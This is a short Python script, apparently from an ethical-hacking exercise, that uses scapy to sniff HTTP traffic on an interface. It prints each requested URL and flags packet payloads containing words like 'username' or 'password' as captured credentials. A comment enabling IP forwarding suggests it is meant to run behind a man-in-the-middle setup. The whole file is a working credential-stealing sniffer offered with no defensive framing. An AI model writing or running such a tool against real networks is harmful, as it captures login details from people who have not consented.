#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
# sysctl -w net.ipv4.ip_forward=1


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "email"]
        for keyword in keywords:
            if keyword in payload:
                return payload


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0")
